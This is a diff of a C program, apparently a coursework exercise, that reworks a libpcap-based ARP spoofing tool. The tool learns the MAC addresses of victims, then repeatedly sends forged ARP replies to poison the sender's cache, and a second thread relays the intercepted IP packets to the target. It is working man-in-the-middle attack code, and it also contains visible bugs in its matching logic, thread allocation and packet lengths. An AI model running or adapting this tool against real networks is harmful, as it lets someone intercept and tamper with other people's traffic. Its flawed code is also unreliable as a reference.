@@ -14,169 +14,24 @@
 #include <sys/socket.h>
 #include <netdb.h>
 
-struct netinfo{
-	pcap_t* handle;
-	uint8_t* my_mac;
-	uint8_t* sender_mac;
-	uint8_t* target_mac;
-	uint8_t* my_ip;
-	uint8_t* sender_ip;
-	uint8_t* target_ip;
-};
-
 struct addr{
 	uint8_t mac[6];
 	uint8_t ip[4];
 };
 
+struct netinfo{
+	struct addr sender;
+	struct addr target;
+};
+
+const char* interface;
+
+struct netinfo* infolist;
+struct addr myaddr;
+
 void printMAC(uint8_t* mac){
 	for(int i=0;i<5;i++)printf("%02x:",mac[i]);
 	printf("%02x\n",mac[5]);
-}
-
-void construct_eth(struct ether_header *eth,uint8_t* dst_mac,uint8_t* src_mac){
-	memcpy(eth->ether_dhost,dst_mac,6);
-	memcpy(eth->ether_shost,src_mac,6);
-	eth->ether_type=ntohs(ETHERTYPE_ARP);
-}
-
-void construct_arp(struct ether_arp *arp,uint8_t* dst_mac,uint8_t* src_mac,char *dst_ip,char* src_ip,int opcode){
-	arp->arp_hrd=htons(ARPHRD_ETHER);
-	arp->arp_pro=htons(ETHERTYPE_IP);
-	arp->arp_hln=ETHER_ADDR_LEN;
-	arp->arp_pln=sizeof(in_addr_t);
-	if(opcode)arp->arp_op=htons(ARPOP_REQUEST);
-	else arp->arp_op=htons(ARPOP_REPLY);
-	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
-	else memset(arp->arp_tha,'\x00',6);
-	memcpy(arp->arp_sha,src_mac,6);
-	inet_aton(dst_ip,arp->arp_tpa);
-	inet_aton(src_ip,arp->arp_spa);
-}
-
-uint8_t* combine(struct ether_header *eth,struct ether_arp *arp){
-	uint8_t *frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
-	memset(frame,0x00,sizeof(struct ether_header)+sizeof(struct ether_arp));
-	memcpy(frame,eth,sizeof(struct ether_header));
-	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
-	return frame;
-}
-
-void get_othermac(uint8_t* mac,uint8_t* data,const char* ip,pcap_t* handle){
-	const uint8_t* packet;
-	int res;
-	struct pcap_pkthdr* header;
-
-	if(pcap_sendpacket(handle,data,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
-		pcap_perror(handle,0);
-		pcap_close(handle);
-		exit(1);
-	}
-	while(1){
-		res=pcap_next_ex(handle,&header,&packet);
-		struct ether_header *etherneth;
-		etherneth=(struct ether_header*)packet;
-	
-		if(ntohs(etherneth->ether_type)==ETHERTYPE_ARP){
-			struct ether_arp *arph;
-			arph=(struct ether_arp*)(packet+sizeof(struct ether_header));
-			unsigned char buf[100];
-				
-			sprintf(buf,"%d.%d.%d.%d",arph->arp_spa[0],arph->arp_spa[1],arph->arp_spa[2],arph->arp_spa[3]);
-			if(!strcmp(buf,ip)){
-				printf("same with %s\n",ip);
-				memcpy(mac,&packet[6],6);
-				break;
-			}
-			printf("unsame with %s\n",ip);
-		}
-		if(res==0)continue;
-		if(res==-1||res==-2)break;
-	}
-}
-
-void *arp_infect_sender(void *data){
-	struct netinfo* info=(struct netinfo*)data;
-	struct ether_header fake_eth;
-	struct ether_arp fake_arp;
-	uint8_t* fake_frame;
-	construct_eth(&fake_eth,info->sender_mac,info->my_mac);
-	construct_arp(&fake_arp,info->sender_mac,info->my_mac,info->sender_ip,info->target_ip,0);
-	fake_frame=combine(&fake_eth,&fake_arp);
-	
-	printf("arp infect start\n");
-	while(1){
-		if(pcap_sendpacket(info->handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
-			pcap_perror(info->handle,0);
-			pcap_close(info->handle);
-			exit(1);
-		}
-		sleep(1);
-	}
-}
-
-/*void *arp_infect_target(void *data){
-	struct netinfo* info=(struct netinfo*)data;
-	struct ether_header fake_eth;
-	struct ether_arp fake_arp;
-	uint8_t* fake_frame;
-	construct_eth(&fake_eth,info->target_mac,info->my_mac);
-	construct_arp(&fake_arp,info->target_mac,info->my_mac,info->target_ip,info->sender_ip,0);
-	fake_frame=combine(&fake_eth,&fake_arp);
-	
-	printf("arp infect start\n");
-	while(1){
-		if(pcap_sendpacket(info->handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
-			pcap_perror(info->handle,0);
-			pcap_close(info->handle);
-			exit(1);
-		}
-		sleep(1);
-	}
-}*/
-
-
-void *ip_forward(void *data){
-	struct netinfo* info=(struct netinfo*)data;
-	const uint8_t* packet;
-	int res;
-	struct pcap_pkthdr* header;
-
-	while(1){
-		res=pcap_next_ex(info->handle,&header,&packet);
-		struct ether_header* eth;
-	
-		eth=(struct ether_header*)packet;
-		
-		//check dst mac is my_mac
-		if(strcmp(eth->ether_dhost,info->my_mac))continue;
-
-		//check ip packet
-		if(ntohs(eth->ether_type)==ETHERTYPE_IP){
-			struct ip* iph;
-			
-			iph=(struct ip*)(packet+sizeof(struct ether_header));
-			if(iph->ip_p!=IPPROTO_IP)continue;	
-			
-			uint8_t* address=inet_ntoa(iph->ip_src);
-			//check src ip
-			if(strcmp(address,info->sender_ip))continue;
-
-			uint8_t* fake_packet=(uint8_t*)malloc(100);
-			memcpy(fake_packet,packet,100);
-			eth=(struct ether_header*)fake_packet;
-			memcpy(eth->ether_shost,info->my_mac,6);
-			memcpy(eth->ether_dhost,info->target_mac,6);
-
-			if(pcap_sendpacket(info->handle,fake_packet,100)==-1){
-				pcap_perror(info->handle,0);
-				pcap_close(info->handle);
-				exit(1);
-			}
-		}
-		if(res==0)continue;
-		else if(res==-1||res==-2)break;
-	}
 }
 
 void getmacaddr(struct addr *addr,const char* inf){
@@ -208,97 +63,224 @@ void getipaddr(struct addr *addr,const char* inf){
 	memcpy(addr->ip,&(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr),4);
 }
 
-int main(int argc, char* argv[]){
-	char* interface=argv[1];
-	char* sender_ip=argv[2];
-	char* target_ip=argv[3];
-	uint8_t att[100];
-	uint8_t *attacker_mac=(uint8_t*)malloc(6);
-	uint8_t *sender_mac=(uint8_t*)malloc(6);
-	uint8_t *target_mac=(uint8_t*)malloc(6);
-	uint8_t *frame_sender,*fake_frame;
-	struct ether_header eth,fake_eth;
-	struct ether_arp arp_req,fake_arp;
+void construct_eth(struct ether_header *eth,uint8_t* dst_mac,uint8_t* src_mac){
+	memcpy(eth->ether_dhost,dst_mac,6);
+	memcpy(eth->ether_shost,src_mac,6);
+	eth->ether_type=ntohs(ETHERTYPE_ARP);
+}
+
+void construct_arp(struct ether_arp *arp,uint8_t* dst_mac,uint8_t* src_mac,int opcode){
+	arp->arp_hrd=htons(ARPHRD_ETHER);
+	arp->arp_pro=htons(ETHERTYPE_IP);
+	arp->arp_hln=ETHER_ADDR_LEN;
+	arp->arp_pln=sizeof(in_addr_t);
+	if(opcode)arp->arp_op=htons(ARPOP_REQUEST);
+	else arp->arp_op=htons(ARPOP_REPLY);
+	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
+	else memset(arp->arp_tha,'\x00',6);
+	memcpy(arp->arp_sha,src_mac,6);
+}
+
+void combine(uint8_t* frame,struct ether_header *eth,struct ether_arp *arp){
+	memset(frame,0x00,sizeof(struct ether_header)+sizeof(struct ether_arp));
+	memcpy(frame,eth,sizeof(struct ether_header));
+	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
+}
+
+void get_othermac(struct addr* target,struct addr* sender){
+	const uint8_t* packet;
+	int res;
+	struct pcap_pkthdr* header;
+	struct ether_header eth;
+	struct ether_arp arp;
+	uint8_t* frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
+	pcap_t* handle;
+	char errbuf[PCAP_ERRBUF_SIZE];
+
+	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
+
+	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",sender->mac);
+	construct_arp(&arp,NULL,sender->mac,1);
+	memcpy((&arp)->arp_tpa,target->ip,4);
+	memcpy((&arp)->arp_spa,sender->ip,4);
+	combine(frame,&eth,&arp);
+	
+	if(pcap_sendpacket(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
+		pcap_perror(handle,0);
+		pcap_close(handle);
+		exit(1);
+	}
+	while(1){
+		res=pcap_next_ex(handle,&header,&packet);
+		struct ether_header *etherneth;
+		etherneth=(struct ether_header*)packet;
+	
+		if(ntohs(etherneth->ether_type)==ETHERTYPE_ARP){
+			struct ether_arp *arph;
+			arph=(struct ether_arp*)(packet+sizeof(struct ether_header));
+			
+			for(int i=0;i<4;i++){
+				if(arph->arp_spa[i]!=target->ip[i]){
+				printf("unsame ip\n");
+				continue;
+				}
+			}
+
+			printf("same ip\n");
+			memcpy(target->mac,&packet[6],6);
+                        printMAC(target->mac);
+                        break;
+		}
+		if(res==0)continue;
+		if(res==-1||res==-2)break;
+	}
+}
+
+void* arp_infect(void* data){
+	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
+	info=(struct netinfo*)data;
+	struct ether_header fake_eth;
+	struct ether_arp fake_arp;
+	uint8_t* fake_frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
+	pcap_t* handle;	
+	char errbuf[PCAP_ERRBUF_SIZE];
+
+	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
+
+	construct_eth(&fake_eth,info->sender.mac,myaddr.mac);
+	construct_arp(&fake_arp,info->sender.mac,myaddr.mac,0);
+	memcpy((&fake_arp)->arp_tpa,info->sender.ip,4);
+	memcpy((&fake_arp)->arp_spa,info->target.ip,4);
+	combine(fake_frame,&fake_eth,&fake_arp);
+
+	printf("arp infect start\n");
+	while(1){
+		if(pcap_sendpacket(handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
+		pcap_perror(handle,0);
+		pcap_close(handle);
+		}
+		sleep(1);
+	}
+	free(info);
+	free(fake_frame);
+}
+
+void* ip_forward(void* data){
+	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
+	info=(struct netinfo*)data;
+	const uint8_t* packet;
+	int res;
+	struct pcap_pkthdr* header;
+	struct ether_header* eth;
+	struct ip* iph;
+	uint8_t* address=(uint8_t*)malloc(30);
+	uint8_t cmpip[30];
+	uint8_t* fake_packet=(uint8_t*)malloc(100);
+	pcap_t* handle;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	
+	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
+		
+	while(1){
+		res=pcap_next_ex(handle,&header,&packet);
+		
+		eth=(struct ether_header*)packet;
+		if(memcmp(eth->ether_dhost,myaddr.mac,6))continue;
+		//check whether packet's source mac is sender's mac
+		if(memcmp(eth->ether_shost,info->sender.mac,6))continue;
+		//check whether packet is ip protocol
+		if(ntohs(eth->ether_type)!=ETHERTYPE_IP)continue;
+
+		printf("this packet is ip protocol\n");
+		iph=(struct ip*)(packet+sizeof(struct ether_header));
+		//check whether packet's target ip is target's ip
+		address=inet_ntoa(iph->ip_dst);
+		sprintf(cmpip,"%d.%d.%d.%d",info->target.ip[0],info->target.ip[1],info->target.ip[2],info->target.ip[3]);
+		if(strcmp(address,cmpip))continue;
+		printf("we must forward it\n");
+
+		//forwarding
+		memcpy(fake_packet,packet,100);
+		memcpy(&fake_packet[6],myaddr.mac,6);
+		memcpy(&fake_packet[0],info->target.mac,6);
+		if(pcap_sendpacket(handle,fake_packet,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
+                pcap_perror(handle,0);
+                pcap_close(handle);
+                exit(1);
+        }
+		printf("forwarding complete\n");
+	}
+	free(address);
+	free(info);
+	free(fake_packet);
+}
+
+void* arp_spoof(void* data){
+	struct netinfo* info=(struct netinfo*)malloc(sizeof(struct netinfo));
+	info=(struct netinfo*)data;
 	pthread_t thread[2];
 	int status;
 	int thread_id;
-	struct addr address;
-
-	printf("attacker mac : ");
-	getmacaddr(&address,interface);
-	attacker_mac=address.mac;
-	printMAC(attacker_mac);
-
-	printf("attacker ip : ");
-	getipaddr(&address,interface);
-	sprintf(att,"%d.%d.%d.%d",address.ip[0],address.ip[1],address.ip[2],address.ip[3]);
-	printf("%s\n",att);
-
-	//pcap_open
-	pcap_t* handle;
-	char* errbuf[PCAP_ERRBUF_SIZE];
-	int res;
 	
-	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
-	if(handle=NULL){
-		fprintf(stderr,"couldn't open device %s:%s\n",interface,errbuf);
+	//infect sender's arp table periodly
+	thread_id=pthread_create(&thread[0],NULL,arp_infect,(void*)info);
+	if(thread_id){
+		fprintf(stderr,"pthread_create error\n");
 		exit(1);
 	}
 
-	//get sender mac
-	memset(&eth,0x00,sizeof(struct ether_header));
-	memset(&arp_req,0x00,sizeof(struct ether_arp));
-	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
-	construct_arp(&arp_req,NULL,attacker_mac,sender_ip,att,1);
-	frame_sender=combine(&eth,&arp_req);
-	printf("ds");
-	get_othermac(sender_mac,frame_sender,sender_ip,handle);
-	printf("sender mac : ");
-	printMAC(sender_mac);
-
-	//get target mac
-	memset(&eth,0x00,sizeof(struct ether_header));
-	memset(&arp_req,0x00,sizeof(struct ether_arp));
-	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
-	construct_arp(&arp_req,NULL,attacker_mac,target_ip,att,1);
-	frame_sender=combine(&eth,&arp_req);
-	get_othermac(target_mac,frame_sender,target_ip,handle);
-	printf("target mac : ");
-	printMAC(target_mac);
-
-	//thread1_arp infect periodly
-
-	struct netinfo *info;
-	info->handle=handle;
-	info->my_mac=attacker_mac;
-	info->sender_mac=sender_mac;
-	info->target_mac=target_mac;
-	info->my_ip=att;
-	info->sender_ip=sender_ip;
-	info->target_ip=target_ip;
-
-	thread_id=pthread_create(&thread[0],NULL,arp_infect_sender,(void*)info);
-	if(thread_id < 0){
-		printf("pthread create error\n");
-		exit(1);
-	}
-
-	/*thread_id=pthread_create(&thread[1],NULL,arp_infect_target,(void*)info);
-	if(thread_id < 0){
-		printf("pthread create error\n");
-	}*/
-
+	//ip packet forwarding
 	thread_id=pthread_create(&thread[1],NULL,ip_forward,(void*)info);
-	if(thread_id < 0){
-		printf("pthread create error\n");
-		exit(1);
-	}
+        if(thread_id){
+                fprintf(stderr,"pthread_create error\n");
+                exit(1);
+        }
 
 	pthread_join(thread[0],(void**)&status);
 	pthread_join(thread[1],(void**)&status);
+	free(info);
+}
 
-	pcap_close(handle);
-	//close(fd);
-	return 0;
+int main(int argc,char** argv){
+	char att[30];
+	int session=argc/2-1;
+	pthread_t* thread;
+	int status;
+	int thread_id;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle;
+	interface=argv[1];
 	
+	handle=pcap_open_live(interface,BUFSIZ,0,1000,errbuf);
+
+	printf("my mac : ");
+	getmacaddr(&myaddr,interface);
+	printMAC(myaddr.mac);
+
+	printf("attacker ip : ");
+	getipaddr(&myaddr,interface);
+	sprintf(att,"%d.%d.%d.%d",myaddr.ip[0],myaddr.ip[1],myaddr.ip[2],myaddr.ip[3]);
+	printf("%s\n",att);
+	
+	infolist = (struct netinfo*)malloc(session*sizeof(struct netinfo));
+	for(int i=0;i<session;i++){
+		inet_pton(AF_INET,argv[i*2+2],infolist[i].sender.ip);
+		inet_pton(AF_INET,argv[i*2+3],infolist[i].target.ip);
+		get_othermac(&(infolist[i].sender),&myaddr);
+		get_othermac(&(infolist[i].target),&myaddr);
+	}
+	thread = (pthread_t*)malloc(sizeof(pthread_t));
+	for(int i=0;i<session;i++){
+		thread_id=pthread_create(&thread[i],NULL,arp_spoof,(void*)&infolist[0]);
+		if(thread_id){
+			fprintf(stderr,"pthread_create error\n");
+			exit(1);
+		}
+		sleep(3);
+	}
+	for(int i=0;i<session;i++){
+		pthread_join(thread[i],(void**)&status);
+	}
+	pcap_close(handle);
+	return 0;
 }
